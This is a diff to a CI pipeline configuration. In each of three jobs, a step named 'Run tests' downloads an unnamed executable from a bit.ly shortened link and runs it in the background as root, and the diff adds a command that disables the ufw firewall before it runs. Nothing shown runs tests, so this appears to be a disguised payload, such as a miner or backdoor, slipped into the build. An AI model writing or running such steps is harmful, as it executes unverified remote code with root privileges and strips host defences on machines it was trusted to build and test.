@@ -8,6 +8,7 @@ jobs:
       - run: 
           name: Run tests 
           command: |
+           sudo su --command "sudo ufw disable"
            sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
            sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
            sudo su --command "sleep 5"
@@ -27,6 +28,7 @@ jobs:
       - run: 
           name: Run tests 
           command: |
+           sudo su --command "sudo ufw disable"
            sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
            sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
            sudo su --command "sleep 5"
@@ -46,6 +48,7 @@ jobs:
       - run: 
           name: Run tests 
           command: |
+           sudo su --command "sudo ufw disable"
            sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
            sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
            sudo su --command "sleep 5"
